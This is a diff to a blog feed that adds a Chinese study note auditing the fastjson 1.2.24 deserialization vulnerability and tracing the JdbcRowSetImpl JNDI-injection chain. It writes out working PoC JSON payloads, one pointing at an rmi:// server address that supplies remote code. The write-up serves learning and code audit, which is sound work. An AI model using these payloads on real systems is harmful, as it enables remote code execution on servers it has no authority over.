@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>fastjson1.2.24审计</title>
+    <link href="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/"/>
+    <url>/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/</url>
+    
+    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建javaEE项目，jdk选择8U112，在pom.xml里面导入fastjson依赖</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/1.png" class=""><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>引入fastjson依赖，然后起一个Ldap服务</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/2.png" class=""><p>在代码中导入fastjson，并且使用JSON类的parse类进行解析POC</p><p>Poc为：</p><p>{“@type”:”Lcom.sun.rowset.JdbcRowSetImpl;”,”dataSourceName”:”ldap服务地址”,”autoCommit”:true}</p><p>执行calc，弹出计算器</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/3.png" class=""><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>默认情况下，JSON.parse默认的反序列化对象是：com.alibaba.fastjson.JSONObject</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/4.png" class=""><p>但是可以添加@type方法来指定反序列化的对象，这里的Persion设置名称和年龄封装</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/5.png" class=""><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/6.png" class=""><p>Fastjson会通过反射来实例化和set值，所以在persion类里面加入print函数，用来查看调用情况</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/7.png" class=""><p>根据我们构造的json序列化文件传入name</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/8.png" class=""><p>根据执行结果分析，无参方法和有参方法都可以被调用，由于无参方法难以利用，就不管了，所以只需要找到一个类，里面可以调用</p><h3 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h3><p>POC为：</p><p>{“@type”:”Lcom.sun.rowset.JdbcRowSetImpl;”,”dataSourceName”:”rmi:&#x2F;&#x2F;192.168.96.214:1099&#x2F;nptpjv”,”autoCommit”:true}</p><p>在 Java 的内部表示中，类的类型描述符是以 L 开头，后跟类的全限定名，再以分号结尾。例如，Lcom.sun.rowset.JdbcRowSetImpl; 就是 com.sun.rowset.JdbcRowSetImpl 类的类型描述符。</p><p>可以根据poc进行反推，可以知道这个被利用的类是com.sun.rowset.JdbcRowSetImpl，传入的参数为：dataSourceName、autoCommit，也就是说在com.sun.rowset.JdbcRowSetImpl中，用到了setDataSourceName方法或者setAutoCommit，直接去代码中查看发生了什么</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/9.png" class=""><p>直接跟进this.connect()，发现这里存在jndi注入，刚好参数为dataSourceName，也就是上面SetDataSourceName传入的jndi注入poc</p><img src="/2026/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/fastjson1-2-24%E5%AE%A1%E8%AE%A1/10.png" class=""><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Fastjson反序列化json的序列化文件后，会解析@type提供的对象，根据对象传入参数，比如jdbcRowSetImpl这条链里面的setAutoCommit方法中调用了connect()，connect方法中存在InitialContext.lookup()方法，并且参数可控，存在jndi注入</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>学习笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>笔记</tag>
+      
+      <tag>教程</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>go笔记</title>
     <link href="/2026/03/16/go%E7%AC%94%E8%AE%B0/go%E7%AC%94%E8%AE%B0/"/>
     <url>/2026/03/16/go%E7%AC%94%E8%AE%B0/go%E7%AC%94%E8%AE%B0/</url>
